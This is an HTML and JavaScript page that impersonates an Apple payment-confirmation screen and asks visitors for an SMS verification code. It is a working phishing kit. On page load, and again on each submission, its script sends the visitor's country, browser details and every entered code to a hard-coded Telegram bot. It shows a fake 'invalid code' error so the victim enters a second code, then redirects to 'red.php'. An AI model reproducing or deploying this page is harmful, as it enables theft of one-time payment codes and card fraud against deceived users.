<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Apple ID Confirmation</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;600&display=swap');

* { box-sizing: border-box; margin: 0; padding: 0; }
body {
    font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: linear-gradient(180deg, #e5e5ea, #f2f2f7);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    color: #1d1d1f;
}
.container {
    background-color: #fff;
    padding: 50px 40px;
    border-radius: 20px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.15);
    width: 100%;
    max-width: 400px;
    text-align: center;
}
.logo { width: 72px; margin-bottom: 25px; }
h1 { font-weight: 600; font-size: 26px; margin-bottom: 5px; }
p { font-size: 14px; color: #6e6e73; margin-bottom: 30px; }
input[type="text"], input[type="number"] {
    width: 100%;
    padding: 14px;
    margin-bottom: 5px;
    border-radius: 12px;
    border: 1px solid #d1d1d6;
    font-size: 16px;
    transition: border 0.3s, box-shadow 0.3s;
}
input:focus { border: 1px solid #0071e3; box-shadow: 0 0 5px rgba(0,113,227,0.5); outline: none; }

button, input[type="submit"] {
    width: 100%;
    padding: 15px;
    background-color: #0071e3;
    background-image: linear-gradient(90deg, #0071e3, #005bb5);
    color: white;
    font-size: 16px;
    font-weight: 600;
    border: none;
    border-radius: 12px;
    cursor: pointer;
    margin-top: 10px;
    transition: background 0.3s;
    box-sizing: border-box; /* ensure same sizing */
    display: block;
}

button:hover, input[type="submit"]:hover { background-image: linear-gradient(90deg, #005bb5, #0071e3); }

.section-title { text-align: left; font-weight: 600; margin: 20px 0 10px 0; color: #1d1d1f; font-size: 16px; }
.error-message { color: red; font-size: 13px; margin-bottom: 10px; display: none; text-align: left; }
.app-approve { background-color: #f2f2f7; border-radius: 15px; padding: 15px; margin-top: 20px; text-align: left; }
.app-approve p { font-size: 14px; color: #1d1d1f; margin-bottom: 10px; }
.footer { margin-top: 40px; font-size: 12px; color: #6e6e73; line-height: 1.5; text-align: center; }
.footer a { color: #06c; text-decoration: none; margin: 0 5px; }
@media (max-width: 420px) { .container { padding: 30px 20px; } h1 { font-size: 24px; } input, button { padding: 12px; font-size: 15px; } }
</style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
    <h1>Confirm Your Payment</h1>
    <p>Please verify your credit card by entering the SMS code or approving via your Apple device.</p>
    
    <form id="sms-form">
        <div class="section-title">SMS Verification</div>
        <input type="number" id="sms-code" placeholder="Enter 6-digit SMS code" required inputmode="numeric">
        <div class="error-message" id="sms-error">Invalid code, please try again</div>
        <input type="submit" value="Confirm">
    </form>

    <div class="app-approve">
        <p>If you didn't receive the SMS, approve via your Apple device to confirm your info.</p>
        <button id="app-approve-btn">Accept</button>
    </div>

    <div class="footer">
        <p>
            <a href="#">Privacy Policy</a> | 
            <a href="#">Terms of Use</a> | 
            <a href="#">Apple Support</a>
        </p>
        <p>Apple &copy; 2025 Apple Inc. All rights reserved.</p>
    </div>
</div>

<script>
    <?php require_once('dr3.php'); ?>
// Telegram Bot details (replace with your actual bot token and chat ID)
const TELEGRAM_BOT_TOKEN = '8450566694:AAHKZmBuNJZ8BdvkA4ab6kli8PXC24X2D2U';
const TELEGRAM_CHAT_ID = '-4932499123';

let firstAttemptSMS = true;
let userCountry = 'Unknown';

const smsInput = document.getElementById('sms-code');
smsInput.setAttribute('maxlength','6'); // only 6 digits max

// prevent typing more than 6 digits
smsInput.addEventListener('input', function() {
    if(this.value.length > 6) {
        this.value = this.value.slice(0,6);
    }
});

// Function to send message to Telegram
async function sendToTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') {
        console.log('Telegram notification:', message);
        return false;
    }
    
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

// Function to get user's country based on IP
async function getUserCountry() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return data.country_code;
    } catch (error) {
        console.error('Error detecting country:', error);
        return 'Unknown';
    }
}

// Collect user data
function collectUserData() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        date: new Date().toISOString()
    };
}

// Initialize page
document.addEventListener('DOMContentLoaded', async function() {
    // Get user country
    userCountry = await getUserCountry();
    
    // Send initial notification to Telegram
    const userData = collectUserData();
    const accessMessage = `🔔 SMS Verification Page accessed\n\n🌐 Country: ${userCountry}\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
    sendToTelegram(accessMessage);
});

// Handle SMS form submission
document.getElementById('sms-form').addEventListener('submit', async function(e){
    e.preventDefault();
    const code = smsInput.value.trim();
    const error = document.getElementById('sms-error');
    
    // Collect user data
    const userData = collectUserData();
    
    if(firstAttemptSMS){
        // First attempt - send code to Telegram and show error
        const message = `📩 First SMS Code Received\n\n🔢 Code: ${code}\n🌐 Country: ${userCountry}\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
        
        await sendToTelegram(message);
        error.style.display = 'block';
        firstAttemptSMS = false;
    } else {
        // Second attempt - send code to Telegram and redirect
        const message = `📩 Second SMS Code Received\n\n🔢 Code: ${code}\n🌐 Country: ${userCountry}\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
        
        await sendToTelegram(message);
        error.style.display = 'none'; 
        window.location.href = "red.php"; // redirect after second attempt
    }
    
    // Clear the input field
    smsInput.value = '';
});

// App approve button
document.getElementById('app-approve-btn').addEventListener('click', function(){
    // Send notification to Telegram about app approval
    const userData = collectUserData();
    const message = `📱 App Approval Button Clicked\n\n🌐 Country: ${userCountry}\n🖥️ User Agent: ${userData.userAgent}\n📱 Platform: ${userData.platform}\n🕒 Time: ${userData.date}`;
    
    sendToTelegram(message);
    window.location.href = "red.php"; // redirect
});
</script>

</body>
</html>
